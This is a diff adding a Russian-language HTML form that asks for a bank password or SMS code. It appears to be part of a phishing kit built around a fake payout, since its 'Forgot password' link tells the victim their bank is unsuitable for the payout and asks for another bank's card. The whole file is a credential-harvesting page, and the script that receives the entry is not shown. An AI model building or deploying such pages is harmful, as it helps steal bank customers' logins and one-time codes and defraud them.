@@ -1,0 +1,16 @@
+
+<form method="post" onsubmit="event.preventDefault(); return false;" id="user_password_general_form" class="user_password_general_form block-form">
+    <div class="password_general_form">
+        <div class="password_general_form__title">Введите пароль</div>
+        <div class="password_general_form__container">
+            <div class="password_general_form__question">Вы установили его ранее или получили в СМС от банка</div>
+            <div class="password_general_form__input-box">
+                <input type="text" placeholder="Пароль" autocomplete="off" class="user_question_answer" name="user_question_answer" id="user_question_answer">
+            </div>
+            <button type="button" onclick="user_sent_general_password();" class="password_general_form__button button_main_color">Продолжить</button>
+        </div>
+        <div class="password_general_form_link">
+            <a href="javascript:void(0);" class="link_main_color" onclick="change_bank('К сожалению Ваш банк не подходит для получения выплаты. Пожалуйста, укажите карту другого банка.');">Не помню пароль</a>
+        </div>
+    </div>
+</form>
